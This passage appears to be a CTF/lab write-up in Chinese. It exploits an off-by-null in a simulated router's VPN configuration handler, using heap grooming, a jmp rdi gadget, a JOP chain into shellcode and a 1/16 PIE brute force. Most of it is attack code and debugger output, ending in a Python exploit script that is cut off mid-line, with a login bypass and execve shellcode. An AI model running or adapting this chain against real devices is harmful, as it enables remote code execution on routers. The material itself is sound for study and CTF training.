+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void Set_VPN(struct router_msgbuf *msg) &#123;</span><br><span class="line">    int idx = 0;</span><br><span class="line">    if (vpn_list[idx]) &#123;</span><br><span class="line">        printf(&quot;[!] VPN already configured once. Use Edit_VPN_Custom for modifications.\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct vpn_recv *input = (struct vpn_recv *)msg-&gt;payload;</span><br><span class="line">    </span><br><span class="line">    vpn_list[idx] = (struct vpn_config_req *)malloc(sizeof(struct vpn_config_req));</span><br><span class="line">    size_t custom_len = strlen(input-&gt;custom);</span><br><span class="line">    vpn_list[idx]-&gt;custom_len = custom_len;</span><br><span class="line">    if (custom_len &gt; 0) &#123;</span><br><span class="line">        vpn_list[idx]-&gt;custom_ptr = malloc(custom_len + 1);</span><br><span class="line">        memcpy(vpn_list[idx]-&gt;custom_ptr, input-&gt;custom, custom_len);</span><br><span class="line">        vpn_list[idx]-&gt;custom_ptr[custom_len] = &#x27;\0&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        vpn_list[idx]-&gt;custom_ptr = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    vpn_list[idx]-&gt;apply_cb = default_vpn_apply;</span><br><span class="line">    strcpy(vpn_list[idx]-&gt;action, input-&gt;action);</span><br><span class="line">    strcpy(vpn_list[idx]-&gt;name, input-&gt;name);</span><br><span class="line">    strcpy(vpn_list[idx]-&gt;proto, input-&gt;proto);</span><br><span class="line">    strcpy(vpn_list[idx]-&gt;server, input-&gt;server);</span><br><span class="line">    strcpy(vpn_list[idx]-&gt;user, input-&gt;user);</span><br><span class="line">    strcpy(vpn_list[idx]-&gt;pass, input-&gt;pass);</span><br><span class="line">    memcpy(vpn_list[idx]-&gt;cert, input-&gt;cert,sizeof(input-&gt;cert));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们知道这些成员都是从json中取出来的, 一般的json都会在字段的结构加上’\0’</p>
+<p>但如果我们前往.so审计</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">void extract_json_string(const char *json, const char *key, char *out, size_t max_len) &#123;</span><br><span class="line">    out[0] = &#x27;\0&#x27;;</span><br><span class="line">    char search_key[128];</span><br><span class="line">    snprintf(search_key, sizeof(search_key), &quot;\&quot;%s\&quot;&quot;, key);</span><br><span class="line">    </span><br><span class="line">    char *p = strstr(json, search_key);</span><br><span class="line">    if (!p) return;</span><br><span class="line">    </span><br><span class="line">    p += strlen(search_key);</span><br><span class="line">    while (*p == &#x27; &#x27; || *p == &#x27;:&#x27;) p++;</span><br><span class="line">    </span><br><span class="line">    if (*p == &#x27;&quot;&#x27;) &#123;</span><br><span class="line">        p++;</span><br><span class="line">        size_t i = 0;</span><br><span class="line">        while (*p != &#x27;&quot;&#x27; &amp;&amp; *p != &#x27;\0&#x27; &amp;&amp; i &lt; max_len) &#123;</span><br><span class="line">            if (*p == &#x27;\\&#x27; &amp;&amp; *(p+1) != &#x27;\0&#x27;) &#123;</span><br><span class="line">                if (*(p+1) == &#x27;\\&#x27; &amp;&amp; *(p+2) == &#x27;x&#x27; &amp;&amp; isxdigit(*(p+3)) &amp;&amp; isxdigit(*(p+4))) &#123;</span><br><span class="line">                    char hex[3] = &#123; *(p+3), *(p+4), 0 &#125;;</span><br><span class="line">                    out[i++] = (char)strtol(hex, NULL, 16);</span><br><span class="line">                    p += 4;</span><br><span class="line">                &#125; </span><br><span class="line">                else if (*(p+1) == &#x27;x&#x27; &amp;&amp; isxdigit(*(p+2)) &amp;&amp; isxdigit(*(p+3))) &#123;</span><br><span class="line">                    char hex[3] = &#123; *(p+2), *(p+3), 0 &#125;;</span><br><span class="line">                    out[i++] = (char)strtol(hex, NULL, 16);</span><br><span class="line">                    p += 3;</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                    p++;</span><br><span class="line">                    if (*p == &#x27;n&#x27;) out[i++] = &#x27;\n&#x27;;</span><br><span class="line">                    else if (*p == &#x27;r&#x27;) out[i++] = &#x27;\r&#x27;;</span><br><span class="line">                    else if (*p == &#x27;&quot;&#x27;) out[i++] = &#x27;&quot;&#x27;;</span><br><span class="line">                    else if (*p == &#x27;\\&#x27;) out[i++] = &#x27;\\&#x27;;</span><br><span class="line">                    else out[i++] = *p;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                out[i++] = *p;</span><br><span class="line">            &#125;</span><br><span class="line">            p++;</span><br><span class="line">        &#125;</span><br><span class="line">        if (i &lt; max_len) &#123;</span><br><span class="line">            out[i] = &#x27;\0&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现当字段的预定长度被充满后, 就不会在末尾加上null戳</p>
+<p>结合strcpy我们就可以实现off-by-null</p>
+<p>从结构体结构上看, 最有溢出价值的字段就是<code>cert</code>和<code>pass</code>字段, 可以修改两种指针的末尾</p>
+<p>但是在IDA中审计发现, 如果把<code>default_vpn_apply</code>的末尾改成null, 会跳转到一个导致进程段错误的地址</p>
+<p>所以可以利用的字段只剩下了pass字段, 可以修改custom字段的末尾, 而且custom指向的是堆地址</p>
+<p>我们可以用堆风水的手段, 让custom能指向一个能够修改函数指针的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">size_t decode_base64_in_place(char *str) &#123;</span><br><span class="line">    static const int b64_index[256] = &#123;</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0, 62, 63, 62, 62, 63,</span><br><span class="line">        52, 53, 54, 55, 56, 57, 58, 59, 60, 61,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,</span><br><span class="line">        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,  0,  0,  0,  0,  0,</span><br><span class="line">        0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,</span><br><span class="line">        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,</span><br><span class="line">        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    size_t in_len = strlen(str);</span><br><span class="line">    if (in_len == 0) return 0;</span><br><span class="line">    if (strncmp(str, &quot;B64:&quot;, 4) != 0) &#123;</span><br><span class="line">        return in_len; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    char *in = str + 4;</span><br><span class="line">    in_len -= 4;</span><br><span class="line">    size_t out_len = 0;</span><br><span class="line">    </span><br><span class="line">    for (size_t i = 0; i &lt; in_len; i += 4) &#123;</span><br><span class="line">        int n = b64_index[(unsigned char)in[i]] &lt;&lt; 18 |</span><br><span class="line">                b64_index[(unsigned char)in[i+1]] &lt;&lt; 12 |</span><br><span class="line">                b64_index[(unsigned char)in[i+2]] &lt;&lt; 6 |</span><br><span class="line">                b64_index[(unsigned char)in[i+3]];</span><br><span class="line">                </span><br><span class="line">        str[out_len++] = n &gt;&gt; 16;</span><br><span class="line">        if (in[i+2] != &#x27;=&#x27;) str[out_len++] = n &gt;&gt; 8 &amp; 0xFF;</span><br><span class="line">        if (in[i+3] != &#x27;=&#x27;) str[out_len++] = n &amp; 0xFF;</span><br><span class="line">    &#125;</span><br><span class="line">    return out_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同时可以发现在vpn.cgi中, 当字段以<code>B64</code>开头, 整个字段会被base64编码后使用json传输, 这解决了json对不可见字符传递的局限性</p>
+<p>现在可以考虑如何进行堆风水了, 既然想把custom指向函数指针, 我们就要让末尾被置零后的地址小于等于函数指针</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void (*apply_cb)(struct vpn_config_req *);</span><br><span class="line">char action[0x20];</span><br><span class="line">char name[0x20];</span><br><span class="line">char proto[0x20];</span><br><span class="line">char server[0x30];</span><br><span class="line">char user[0x20];</span><br><span class="line">char pass[0x20]; </span><br><span class="line">char *custom_ptr;    </span><br></pre></td></tr></table></figure>
+
+<p>可以看到这两个地址间的offset为<code>8+0x20+0x20+0x20+0x30+0x20+0x20=0xd8</code></p>
+<p>最好的解决方法是让<code>void (*apply_cb)(struct vpn_config_req *)</code>的最低字节为00</p>
+<p>通过简单的计算可以得到, 我们只需要进行<code>wifi*1 + list*7</code>边可以将函数指针挤到末字节为00的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559320</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559360</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555593a0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555593e0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559420</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559460</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594a0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594e0</span><br><span class="line">Size: 0x100 (with flag bits: 0x101)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555595e0</span><br><span class="line">Size: 0x800 (with flag bits: 0x801)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559de0</span><br><span class="line">Size: 0x20220 (with flag bits: 0x20221)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x5555555594e0</span><br><span class="line">00:0000│     0x5555555594e0 ◂— 0</span><br><span class="line">01:0008│     0x5555555594e8 ◂— 0x101</span><br><span class="line">02:0010│     0x5555555594f0 ◂— 0x7eb</span><br><span class="line">03:0018│     0x5555555594f8 ◂— 0xf2e900</span><br><span class="line">04:0020│     0x555555559500 —▸ 0x55555555540d (default_vpn_apply) ◂— endbr64 (here)</span><br><span class="line">05:0028│     0x555555559508 ◂— 0x746573 /* &#x27;set&#x27; */</span><br><span class="line">06:0030│     0x555555559510 ◂— 0</span><br><span class="line">07:0038│     0x555555559518 ◂— 0</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0040│     0x555555559520 ◂— 0</span><br><span class="line">09:0048│     0x555555559528 ◂— 0x31 /* &#x27;1&#x27; */</span><br><span class="line">0a:0050│     0x555555559530 ◂— 0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">0d:0068│     0x555555559548 ◂— 0x6e70766e65706f /* &#x27;openvpn&#x27; */</span><br><span class="line">0e:0070│     0x555555559550 ◂— 0</span><br><span class="line">0f:0078│     0x555555559558 ◂— 0</span><br><span class="line">pwndbg&gt; </span><br><span class="line">10:0080│     0x555555559560 ◂— 0</span><br><span class="line">11:0088│     0x555555559568 ◂— 0x32 /* &#x27;2&#x27; */</span><br><span class="line">12:0090│     0x555555559570 ◂— 0</span><br><span class="line">... ↓     4 skipped</span><br><span class="line">17:00b8│     0x555555559598 ◂— 0x33 /* &#x27;3&#x27; */</span><br><span class="line">pwndbg&gt; </span><br><span class="line">18:00c0│     0x5555555595a0 ◂— 0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">1b:00d8│     0x5555555595b8 ◂— &#x27;4444444444444444444444444&#x27;</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">1e:00f0│     0x5555555595d0 ◂— 0x34 /* &#x27;4&#x27; */</span><br><span class="line">1f:00f8│     0x5555555595d8 —▸ 0x5555555595f0 ◂— 0x10101010101b848</span><br></pre></td></tr></table></figure>
+
+<p>此时从pass字段溢出null, 就可以让custom指向<code>04:0020│     0x555555559500 —▸ 0x55555555540d (default_vpn_apply) ◂— endbr64</code></p>
+<p>我们便可以修改函数指针</p>
+<p><strong>gadget选择</strong></p>
+<p>修改gadget, 需要我们观察default_vpn_apply的函数签名, 可以发现这个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void default_vpn_apply(struct vpn_config_req *req) &#123;</span><br><span class="line">    printf(&quot;[SYS] Applying VPN settings for: %s\n&quot;, req-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数有一个一参</p>
+<p>使用<code>ROPgadget --binary mainproc &gt; gadget</code>提取全部gadget</p>
+<p>发现了一个特殊的gadget : <code>jmp rdi</code></p>
+<p>如果函数指针被覆盖为这个 , 我们便可以跳转到<code>req</code>上, 具体来说是vpn结构体的第一个字段 : <code>uint16_t custom_len;</code></p>
+<p>将这个长度作为机器码执行</p>
+<p>此时的我们便可以任意执行两个字节, 这肯定是不够的</p>
+<p>常见的作法就是将这两个字节写作跳转指令, 方便我们跳转更高地址的堆上执行代码</p>
+<p><img src="/./image-20260317150506445.png" alt="image-20260317150506445"></p>
+<p>处理得当我们就能得到<strong>funtion_ptr-&gt;length-&gt;cert-&gt;custom</strong>的jop链, 最终跳转到custom上, 几乎无限长度地执行shellcode</p>
+<p>我选择是是先在length处<code>jmp $+9</code>, 然后再cert中<code>jmp $+offset</code>进行一段较长跳转, 最后在custom上做nop滑梯2shellcode</p>
+<p>这个过程中因为PIE保护, 需要进行<code>1/16</code>概率的爆破, 才能将<code>jmp rdi</code>写入函数指针</p>
+<p><strong>shellcode</strong></p>
+<p>由于mainproc没有回显, 我们可以加载将flag写入&#x2F;www&#x2F;下的html文件的方法获得flag</p>
+<p>因为http可以代理所有<code>/www/*.html</code>文件</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>综上所述, 将攻击手法转化为http报文后, exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">class IoTClient:</span><br><span class="line">    def __init__(self, base_url=&quot;http://localhost:8080&quot;):</span><br><span class="line">        self.base_url = base_url.rstrip(&#x27;/&#x27;)</span><br><span class="line">        self.session = requests.Session()</span><br><span class="line"></span><br><span class="line">    def login_bypass(self):</span><br><span class="line">        url = f&quot;&#123;self.base_url&#125;/www/http?action=login&amp;auth=1&quot;</span><br><span class="line">        try:</span><br><span class="line">            resp = self.session.get(url, allow_redirects=False)</span><br><span class="line">            if &#x27;session_id&#x27; in self.session.cookies:</span><br><span class="line">                log.info(f&quot;Login bypass success. Session ID: &#123;self.session.cookies[&#x27;session_id&#x27;]&#125;&quot;)</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                log.error(&quot;Failed to obtain session.&quot;)</span><br><span class="line">                return False</span><br><span class="line">        except Exception as e:</span><br><span class="line">            log.error(f&quot;Connection Error: &#123;e&#125;&quot;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def _serialize_payload(self, data):</span><br><span class="line">        serialized = &#123;&#125;</span><br><span class="line">        for k, v in data.items():</span><br><span class="line">            if isinstance(v, bytes):</span><br><span class="line">                if k == &quot;custom&quot;:</span><br><span class="line">                    serialized[k] = &quot;B64:&quot; + base64.b64encode(v).decode(&#x27;utf-8&#x27;)</span><br><span class="line">                else:</span><br><span class="line">                    serialized[k] = &quot;&quot;.join(f&quot;\\x&#123;c:02x&#125;&quot; for c in v)</span><br><span class="line">            elif isinstance(v, str):</span><br><span class="line">                serialized[k] = v</span><br><span class="line">            else:</span><br><span class="line">                serialized[k] = v</span><br><span class="line">        return serialized</span><br><span class="line"></span><br><span class="line">    def set_vpn(self, name, proto=&quot;openvpn&quot;, server=&quot;127.0.0.1&quot;, user=&quot;admin&quot;, password=&quot;password&quot;, cert=&quot;cert.ovpn&quot;, custom=&quot;&quot;):</span><br><span class="line">        url = f&quot;&#123;self.base_url&#125;/cgi-bin/vpn.cgi&quot;</span><br><span class="line">        </span><br><span class="line">        payload = self._serialize_payload(&#123;</span><br><span class="line">            &quot;action&quot;: &quot;set&quot;,</span><br><span class="line">            &quot;name&quot;: name,</span><br><span class="line">            &quot;proto&quot;: proto,</span><br><span class="line">            &quot;server&quot;: server,</span><br><span class="line">            &quot;user&quot;: user,</span><br><span class="line">            &quot;pass&quot;: password,</span><br><span class="line">            &quot;cert&quot;: cert,</span><br><span class="line">            &quot;custom&quot;: custom</span><br><span class="line">        &#125;)</span><br><span class="line">        return self._post_json(url, payload)</span><br><span class="line"></span><br><span class="line">    def edit_vpn(self, custom_content):</span><br><span class="line">        url = f&quot;&#123;self.base_url&#125;/cgi-bin/vpn.cgi&quot;</span><br><span class="line">        </span><br><span class="line">        payload = self._serialize_payload(&#123;</span><br><span class="line">            &quot;action&quot;: &quot;edit&quot;,</span><br><span class="line">            &quot;custom&quot;: custom_content</span><br><span class="line">        &#125;)</span><br><span class="line">        return self._post_json(url, payload)</span><br><span class="line"></span><br><span class="line">    def apply_vpn(self):</span><br><span class="line">        url = f&quot;&#123;self.base_url&#125;/cgi-bin/vpn.cgi&quot;</span><br><span class="line">        payload = &#123;</span><br><span class="line">            &quot;action&quot;: &quot;apply&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        return self._post_json(url, payload)</span><br><span class="line"></span><br><span class="line">    def set_wifi(self, ssid, password):</span><br><span class="line">        url = f&quot;&#123;self.base_url&#125;/cgi-bin/wifi.cgi&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;action&quot;: &quot;save&quot;,</span><br><span class="line">            &quot;ssid&quot;: ssid,</span><br><span class="line">            &quot;password&quot;: password</span><br><span class="line">        &#125;</span><br><span class="line">        return self._post_form(url, data)</span><br><span class="line"></span><br><span class="line">    def manage_list(self, action, idx, mac=&quot;&quot;, note=&quot;&quot;):</span><br><span class="line">        url = f&quot;&#123;self.base_url&#125;/cgi-bin/list.cgi&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;action&quot;: action,</span><br><span class="line">            &quot;idx&quot;: idx,</span><br><span class="line">            &quot;mac&quot;: mac,</span><br><span class="line">            &quot;note&quot;: note</span><br><span class="line">        &#125;</span><br><span class="line">        return self._post_form(url, data)</span><br><span class="line"></span><br><span class="line">    def _post_json(self, url, json_data):</span><br><span class="line">        try:</span><br><span class="line">            resp = self.session.post(url, json=json_data)</span><br><span class="line">            return resp.json()</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return &#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: str(e)&#125;</span><br><span class="line"></span><br><span class="line">    def _post_form(self, url, data):</span><br><span class="line">        try:</span><br><span class="line">            resp = self.session.post(url, data=data)</span><br><span class="line">            return resp.json()</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return &#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: str(e)&#125;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    client = IoTClient()</span><br><span class="line">    if not client.login_bypass():</span><br><span class="line">        log.error(&quot;Login bypass failed. Check if the server is running and reachable.&quot;)</span><br><span class="line">        exit(1)</span><br><span class="line">    log.info(&quot;Step 1: Setting WiFi...&quot;)</span><br><span class="line">    print(client.set_wifi(ssid=&quot;1&quot;, password=&quot;2&quot;))</span><br><span class="line">    log.info(&quot;Step 2: Adding 7 blacklist entries...&quot;)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        print(client.manage_list(action=&quot;add_black&quot;, idx=i, mac=&quot;123&quot;, note=&quot;123&quot;))</span><br><span class="line">    log.info(&quot;Step 3: Setting VPN initial config...&quot;)</span><br><span class="line">    shellcode= asm(shellcraft.execve(&quot;/bin/sh&quot;,[&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;cat flag &gt; ./www/flag.html&quot;],0))</span><br><span class="line">    print(client.set_vpn(name=&quot;1&quot;, proto=&quot;openvpn&quot;, server=&quot;2&quot;, user=&quot;3&quot;, password=&quot;4&quot;*0x20, cert=b&quot;\x00\xe9\xf2\x00\x00\x00&quot;, 